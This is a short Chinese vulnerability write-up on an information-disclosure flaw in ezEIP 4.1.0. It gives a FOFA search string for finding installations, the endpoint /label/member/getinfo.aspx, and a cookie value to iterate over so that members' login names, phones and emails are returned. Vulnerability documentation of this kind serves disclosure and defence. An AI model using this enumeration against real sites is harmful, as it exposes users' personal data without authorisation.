---
title: ezEIP 4.1.0 信息泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - CMS漏洞
 - ezEIP
---

# ezEIP 4.1.0 信息泄露漏洞

## 漏洞描述

ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息

## 漏洞影响

> [!NOTE]
>
> ezEIP 4.1.0 

## FOFA

> [!NOTE]
>
> "ezEIP"

## 漏洞复现

漏洞Url为

```
/label/member/getinfo.aspx
```

访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息）

```
WHIR_USERINFOR=whir_mem_member_pid=1;
```

![ez-1](/img/20210924020230857887.png)